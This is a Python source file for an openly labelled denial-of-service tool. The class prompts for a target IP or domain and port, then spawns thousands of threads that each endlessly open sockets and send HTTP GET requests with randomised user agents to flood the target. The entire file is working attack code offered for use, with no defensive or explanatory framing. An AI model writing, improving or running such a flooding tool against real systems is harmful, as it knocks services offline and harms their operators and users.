import time
import socket
import threading
from colorama import Fore
from fake_useragent import UserAgent

from services.interface import IService


class Ddos(IService):
    def __init__(self) -> None:
        self.packages = 0
        self.headers = ('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n'
                        'Accept-Language: en-us,en;q=0.5\n'
                        'Accept-Encoding: gzip,deflate\n'
                        'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n'
                        'Keep-Alive: 115\n'
                        'Connection: keep-alive')
        self.user_agents = UserAgent()
        self.address = input(f'Ip or domain: ')
        self.port = int(input(f'Port (80 by default): ') or 80)
        self.threads = int(input(f'Threads (2000 by default): ') or 2000)

    def run(self) -> None:
        print(f'{Fore.YELLOW}Scanning...')

        # Check server
        try:
            s = socket.socket()
            s.connect((self.address, self.port))
        except:
            print(f'{Fore.RED}Server not found')
            exit()

        # Launching threads
        for i in range(self.threads):
            threading.Thread(target=self.attack).start()
            threading.Thread(target=self.attack2).start()

    def attack(self) -> None:
        self.packages += 1
        while True:
            try:
                # Configure packet
                packet = f'GET / HTTP/1.1\nHost: {self.address}\n\n User-Agent: {self.user_agents.random}\n{self.headers}'
                packet = packet.encode('utf-8')

                # Sending packet
                s = socket.socket()
                s.connect((self.address, self.port))
                s.sendto(packet, (self.address, self.port))
                s.send(packet)

                # Simple logging
                current_time = time.ctime(time.time())
                if not self.packages % 100:
                    print(f'{Fore.GREEN}{current_time} Attacking Server->{self.address}')
            except Exception as e:
                # Simple logging
                current_time = time.ctime(time.time())
                print(f'{Fore.RED}{current_time} ERROR {e} Attacking Server->{self.address}')

    # Here is some shit code
    def attack2(self) -> None:
        while True:
            self.attack()
